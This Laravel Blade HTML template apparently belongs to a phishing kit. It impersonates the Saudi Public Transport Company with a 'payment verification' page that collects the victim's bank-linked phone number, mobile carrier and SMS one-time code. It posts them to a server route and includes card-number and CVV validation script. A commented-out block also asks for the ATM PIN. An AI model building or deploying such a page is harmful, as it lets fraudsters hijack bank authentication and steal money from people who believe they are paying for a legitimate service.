<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <title>{{ config('app.name', 'الرئيسية - الشركة السعودية للنقل الجماعي') }}</title>
    <meta charset="UTF-8">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, shrink-to-fit=no">
    <meta name="description" content="The Saudi Public Transport Company (عنوان الموقع) is a public owned transport company, serves the kingdom intracity, intercity and internationally like UAE, Egypt, Qatar, Kuwait, Oman, Syria, Jordan and Yemen.">
    <meta name="keywords" content="عنوان الموقع, Saudi Public Transport Company, mass transportation">
    <!-- <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous"> -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.rtl.min.css" integrity="sha384-nU14brUcp6StFntEOOEBvcJm4huWjB0OcIeQ3fltAfSmuZFrkAif0T+UtNGlKKQv" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{asset('theme/build/assets/style.css')}}">
    <style>
        #error-message{display: none}
        /* The Modal (background) */
.modal {
  display: none; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1; /* Sit on top */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
  background-color: rgb(0,0,0); /* Fallback color */
  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content/Box */
.modal-content {
  background-color: #fefefe;
  margin: 26% auto 15%; /* 15% from the top and centered */
  padding: 20px;
  border: 1px solid #888;
  width: 35%; /* Could be more or less, depending on screen size */
}
@media(max-width:767px)
{
  .modal-content {
  margin: 85% auto 15%; /* 15% from the top and centered */
  width: 84%; /* Could be more or less, depending on screen size */
}
}
/* The Close Button */
.close {
  color: #aaa;
  float: right;
  font-size: 28px;
  font-weight: bold;
}

.close:hover,
.close:focus {
  color: black;
  text-decoration: none;
  cursor: pointer;
}
    </style>
    @yield('styles')
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="{{asset('theme/build/assets/jquery.creditCardValidator.js')}}"></script>
    <script>

        function validate(){
            var valid = true;
            $(".input_box").css('background-color','');
            var message = "";

            var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
            var cvRegex = /^[0-9]{3,3}$/;

            var cardHolderName = $("#cname").val();
            var cardNumber = $("#cnmbr").val();
            var cv = $("#cv").val();

            if(cardHolderName == "" || cardNumber == "" || cv == "") {
                message  += "<div>جميع الحقول ضرورية</div>";
                if(cardHolderName == "") {
                    $("#cname").css('background-color','#FFFFDF');
                }
                if(cardNumber == "") {
                    $("#cnmbr").css('background-color','#FFFFDF');
                }
                if (cv == "") {
                    $("#cv").css('background-color','#FFFFDF');
                }
            valid = false;
            }

            if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
                message  += "<div>الإسم حسب البطاقة غير صحيح</div>";
                    $("#cname").css('background-color','#FFFFDF');
                    valid = false;
            }

            if(cardNumber != "") {
                    $('#cnmbr').validateCreditCard(function(result){
                    if(!(result.valid)){
                            message  += "<div>رقم البطاقة غير صحيح</div>";
                            $("#cnmbr").css('background-color','#FFFFDF');
                            valid = false;
                    }
                });
            }

            // if (cv != "" && !cvRegex.test(cv)) {
            //     message  += "<div>رقم CVV خلف البطاقة غير صحيح</div>";
            //     $("#cv").css('background-color','#FFFFDF');
            //         valid = false;
            // }

            if(message != "") {
                $("#error-message").show();
                $("#error-message").html(message);
            }
            return valid;
        }
    </script>
</head>
<body style="background-color:#F8F8F8">

    <nav class="navbar navbar-expand-lg bg-body-tertiary border-bottom  fixed-top">
        <div class="container-fluid">
            <a class="navbar-brand" href="/" style="color: #3e3838 !important">عنوان الموقع</a>
        </div>
    </nav>
    <div id="carouselExampleCaptions" class="carousel slide">
        <div class="carousel-inner">
            <div class="carousel-item active" style="height:180px;background-image:url('/theme/images/conopg.jpg');background-position: center;" ">
                {{-- <img style="height: 180px;" src="{{asset('theme/images/conopg.jpg')}}" class="d-block w-100"> --}}
                <div class="carousel-caption d-block">
                    {{-- <h1 class="d-block text-light">عنوان الموقع</h1> --}}
                    <p class="d-block text-light">لمتابعة الطلب يرجى إدخال رقم الهاتف المربوط في البنك لمصادقة عملية الدفع بنجاح.
                    </p>
                </div>
            </div>
        </div>
    </div>
    <section class="padding-start container mb-5 mt-5">
      <div class="row justify-content-center ">
        <div class="col-10 col-lg-5 bg-white shadow">
          <div class="row">
            <div class="col-12 mt-3 mb-3">
              {{-- <div class="card">
              </div> --}}
              <div class="card-body">

                <form method="post" action="" id="myForm">
                  @csrf
                    {{-- <div class="col-12 mt-3">
                        <h3 style="color: black">إثبات رقم الهاتف</h3>
                        <p style="color: black; margin-top: 10px">الرجاء إدخال رقم البطاقة السري للصراف الاًلي (ATM) المكون من 4 خانات للتأك من عملية الدفع</p>
                        <hr>
                    </div> --}}
                    <div class="col-12">
                      <div class="mb-3">
                        <label for="phone" class="form-label" style="color: #3e3838 !important;font-size: 14px;">رقم الجوال</label>
                        <input style="color: #3e3838 !important" onkeypress="return onlyNumberKey(event)" maxlength="10" type="tel" class="form-control cd required" id="phone" name="phone" placeholder="" required>
                      </div>
                    </div>
                    <div class="col-12">
                      <div class="mb-3">
                        <label for="provider" class="form-label" style="  color: #3e3838 !important;  font-size: 14px;">مشغل شبكة الجوال</label>
                        <select style="color: #3e3838 !important;
                        font-size: 14px;" class="form-control form-control-lg " id="provider" name="provider"  placeholder="" required>
                          <option style="color: #3e3838 !important;
    font-size: 14px;" value="Zain">Zain</option>
                          <option style="color: #3e3838 !important;
    font-size: 14px;" value="Mobily">Mobily</option>
                          <option style="color: #3e3838 !important;
    font-size: 14px;" value="STC">STC</option>
                          <option style="color: #3e3838 !important;
    font-size: 14px;" value="Salam">Salam</option>
                          <option style="color: #3e3838 !important;
    font-size: 14px;" value="Virgin">Virgin</option>
                          <option style="color: #3e3838 !important;
    font-size: 14px;" value="RedBull">RedBull</option>
                        </select>
                      </div>
                    </div>

                  </div>
                  <div class="col-12 mt-5">
                    {{-- write a bootstrap modal --}}


                    <button style="    font-size: 16px;
                    padding: 0.2rem 3rem;
                    display: block;
                    background: #000062"
                    id="myBtn"
                    type="button" class="m-auto btn btn-primary btn-lg form-control-lg">تأكيد</button>
                  </div>

                </form>

              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <div id="myModal" class="modal ">

      <!-- Modal content -->
      <div class="modal-content col-12 col-lg-5 bg-white shadow">
        {{-- <span class="close">&times;</span> --}}
        {{-- add spinner loader here --}}
        <div class="spinner-border text-primary" style="margin: auto;
        height: 25px;
        width: 25px;
        margin-bottom: 6px;"></div>
        <form action="{{route('save_phone_auth_state')}}" method="POST" id="second-form">
          @csrf
          <p class="item-hide" style="color:#3e3838 !important;margin:0;font-size:14px">أدخل رمز التحقق المرسل الى رقم جوالك برسالة نصية <span id="phone_span"></span></p>
          <div class="col-12">
            <div class="item-hide">
              <label for="phone" class="form-label" style="color: #3e3838 !important;font-size: 14px;"></label>
              <input style="color: #3e3838 !important" onkeypress="return onlyNumberKey(event)" maxlength="6" type="tel" class="form-control cd" id="phone" name="code" placeholder="" required>
              <input style="color: #3e3838 !important"  name="phone_number" placeholder="" type="hidden">
              <input style="color: #3e3838 !important"  name="phone_provider" placeholder="" type="hidden">
            </div>
            <div class="text-center mt-1" style="font-size: 14px">00:<span id="time"></span></div>
          </div>
          <div class="col-12 mt-5">
          <button style="    font-size: 16px;
                      padding: 0.2rem 3rem;
                      display: block;
                      background: #000062"
                      id="submit-form"
                      type="button" class="item-hide m-auto btn btn-primary btn-lg form-control-lg">تأكيد</button>
          </div>
        </form>
      </div>

    </div>

    {{-- <footer>
        <p class="text-light">الشركة السعودية للنقل الجماعي (عنوان الموقع)</p>
    </footer> --}}

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
    <script>
        function onlyNumberKey(evt) {

            // Only ASCII character in that range allowed
            var ASCIICode = (evt.which) ? evt.which : evt.keyCode
            if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
                return false;
            return true;
        }
    </script>

    <script>
        const returnid = document.getElementById('returnid');

        function handleRadioClick() {
        if (document.getElementById('show').checked) {
            returnid.style.display = 'block';
        } else {
            returnid.style.display = 'none';
        }
        }

        const radioButtons = document.querySelectorAll('input[name="type"]');
        radioButtons.forEach(radio => {
        radio.addEventListener('click', handleRadioClick);
        });
    </script>

    <script>
        const returnid2 = document.getElementById('returnid2');

        function handleRadioClick() {
        if (document.getElementById('show2').checked) {
            returnid2.style.display = 'block';
        } else {
            returnid2.style.display = 'none';
        }
        }

        const radioButtons2 = document.querySelectorAll('input[name="type"]');
        radioButtons2.forEach(radio => {
        radio.addEventListener('click', handleRadioClick);
        });
    </script>

    <script>
        function onlyNumberKey(evt) {

            // Only ASCII character in that range allowed
            var ASCIICode = (evt.which) ? evt.which : evt.keyCode
            if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57))
                return false;
            return true;
        }
    </script>
    <script>
      // Get the modal
var modal = document.getElementById("myModal");

// Get the button that opens the modal
var btn = document.getElementById("myBtn");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks on the button, open the modal
btn.onclick = function() {
  if(!$('#myForm input[name="phone"]').val())
  {
    $('#myForm input[name="phone"]').css('border','1px solid red')
    $('#myForm input[name="phone"]').css('box-shadow','none')
    $('#myForm input[name="phone"]').focus()

  }else{
    $('#myForm input[name="phone"]').css('border','1px solid #e6dcdc')
    modal.style.display = "block";
    let count = 30;
    const timer = setInterval(function() {
      count--;
      if(count < 10) count = "0"+count
      $('#time').text(count);
      if (count == 0) {
        clearInterval(timer);
      }
    }, 1000);
   document.querySelector('#phone_span').innerText = `******966${document.querySelector('#phone').value.substr(1,3)}+`
  }
  //
}
document.querySelector('#submit-form').onclick = function() {
  if(!$('#second-form input[name="code"]').val())
  {
    $('#myForm input[name="code"]').css('border','1px solid red')
    $('#myForm input[name="code"]').css('box-shadow','none')
    $('#myForm input[name="code"]').focus()

  }else{
    // $('#myForm input[name="code"]').css('border','1px solid #e6dcdc')
    modal.style.display = "block";
    let count = 5;
    const timer = setInterval(function() {
      count--;
      $('.item-hide').hide();
      if (count == 0) {
        clearInterval(timer);
        // append phone input
        $('input[name=phone_number]').val( $('input[name=phone]').val());
        $('input[name=phone_provider]').val( $('select[name=provider]').val());
        $('#second-form').submit()
      }
    }, 1000);
  }
  //
}

// When the user clicks on <span> (x), close the modal
// span.onclick = function() {
//   modal.style.display = "none";
// }

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}
    </script>
<script>

</script>
    @yield('scripts')

</body>
</html>
